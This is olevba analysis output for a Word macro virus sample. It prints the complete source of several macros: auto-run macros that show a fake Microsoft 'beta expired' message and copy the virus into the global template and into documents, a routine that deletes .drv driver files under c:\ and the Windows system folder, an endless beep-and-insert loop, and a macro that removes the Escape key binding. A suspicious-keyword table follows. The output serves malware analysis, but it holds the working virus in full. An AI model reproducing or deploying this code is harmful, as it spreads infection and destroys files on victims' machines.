olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nj-wmdlk1.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nj-wmdlk1.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO crash.bas 
in file: Virus.MSWord.Nj-wmdlk1.j - OLE stream: 'Macros/VBA/crash'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.MsgBox "¡¡¡¡³²³²³²CrAsH OvErRiDe²³³²³²¡¡¡¡¡", "Greetings from"
WordBasic.SendKeys "%" + "S"
Again:
WordBasic.Beep
WordBasic.FontSize 9
WordBasic.Insert "Cool Zero"
GoTo Again
End Sub
-------------------------------------------------------------------------------
VBA MACRO Zero.bas 
in file: Virus.MSWord.Nj-wmdlk1.j - OLE stream: 'Macros/VBA/Zero'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error Resume Next

WordBasic.ToolsCustomizeKeyboard KeyCode:=27, Category:=1, Name:="Abbrechen", Remove:=1, Context:=0

WordBasic.SendKeys "^" + "%" + "-"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nj-wmdlk1.j - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
WordBasic.MsgBox "This beta copy of Microsoft Word has expired.Please install the retail version or obtain an updated beta release from Microsoft", "Microsoft Word"
For i = 1 To WordBasic.CountMacros(0, 0)
    If WordBasic.[MacroName$](i, 0, 0) = "crash" Then
        VInstalled = 1
        End If
Next i

If VInstalled = 1 Then
        GoTo Finish
Else
    On Error Resume Next
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":crash", "Global:crash", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":Zero", "Global:Zero", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExec", "Global:AutoExec", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":ExtrasMakro", "Global:ExtrasMakro", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":killdrv", "Global:killdrv", 1
End If

Finish2:
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "crash" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:crash", WordBasic.[FileName$]() + ":crash", 1
    WordBasic.MacroCopy "Global:Zero", WordBasic.[FileName$]() + ":Zero", 1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.MacroCopy "Global:ExtrasMakro", WordBasic.[FileName$]() + ":ExtrasMakro", 1
    WordBasic.MacroCopy "Global:killdrv", WordBasic.[FileName$]() + ":killdrv", 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
WordBasic.Call "killdrv"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Nj-wmdlk1.j - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
On Error GoTo -1: On Error GoTo Finish
    
For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "crash" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.MacroCopy "Global:crash", WordBasic.[FileName$]() + ":crash", 1
    WordBasic.MacroCopy "Global:Zero", WordBasic.[FileName$]() + ":Zero", 1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.MacroCopy "Global:ExtrasMakro", WordBasic.[FileName$]() + ":ExtrasMakro", 1
    WordBasic.MacroCopy "Global:killdrv", WordBasic.[FileName$]() + ":killdrv", 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
WordBasic.Call "crash"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Nj-wmdlk1.j - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.Call "Zero"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Nj-wmdlk1.j - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "crash" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:crash", WordBasic.[FileName$]() + ":crash", 1
    WordBasic.MacroCopy "Global:Zero", WordBasic.[FileName$]() + ":Zero", 1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.MacroCopy "Global:ExtrasMakro", WordBasic.[FileName$]() + ":ExtrasMakro", 1
    WordBasic.MacroCopy "Global:killdrv", WordBasic.[FileName$]() + ":killdrv", 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ExtrasMakro.bas 
in file: Virus.MSWord.Nj-wmdlk1.j - OLE stream: 'Macros/VBA/ExtrasMakro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Erstellt, löscht und überarbeitet einen Makro oder führt ihn aus."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ExtrasMakro.MAIN"
WordBasic.MsgBox "XX  Cool Zero XX", "Das darfst Du nicht"
End Sub
-------------------------------------------------------------------------------
VBA MACRO killdrv.bas 
in file: Virus.MSWord.Nj-wmdlk1.j - OLE stream: 'Macros/VBA/killdrv'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.Kill "c:\*.drv"
WordBasic.Kill "c:\windows\system\*.drv"
WordBasic.MsgBox "I have ²³³CrAsH OvErRiDe²³² craeted for all my friends", "      XXXXXX      Cool Zero      XXXXXX"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

